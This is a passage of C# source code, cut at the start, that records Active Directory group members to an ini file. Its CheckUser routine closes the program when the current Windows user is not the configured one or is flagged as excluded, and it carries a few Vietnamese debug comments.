                    DirectoryEntry member = new DirectoryEntry(groupMember);
                    d.Add(member.Name.ToString(), "false");
                }

                using (StreamWriter file = new StreamWriter("username.ini"))
                    foreach (var entry in d)
                        file.WriteLine("{0},{1}", entry.Key, entry.Value);

            }
        }

        public static void CheckUser()
        {
            Dictionary<string, string> d_username = new Dictionary<string, string>();
            //Load_File("user_config.ini", d_username);

            if (File.Exists("user_config.ini"))
            {
                Load_File("user_config.ini", d_users);
                if (Boolean.Parse(d_users["Current"].ToString()))
                {
                    if (d_users["Username"].ToString() != Environment.UserName)
                        Environment.Exit(Environment.ExitCode);
                }

                if (Boolean.Parse(d_users["Exclude"].ToString()))
                {
                    if (File.Exists("username.ini"))
                    {
                        StreamReader sr = new StreamReader("username.ini");
                        string line;

                        while ((line = sr.ReadLine()) != null)
                        {
                            string[] arr = line.Split(',');
                            d_username.Add(arr[0], arr[1]);
                        }
                        sr.Close();

                        foreach (var x in d_username)
                        {
                            if (x.Key == Environment.UserName)
                            {
                                //MessageBox.Show("Trùng tên");
                                if (Boolean.Parse(x.Value) == true)
                                {
                                    //MessageBox.Show("Đóng cmnr");
                                    Environment.Exit(Environment.ExitCode);
                                    //MessageBox.Show("Đã đóng");
                                }

                            }

                        }
                    }

                }
            }
        }
        ////----------------------------------//
    }
}
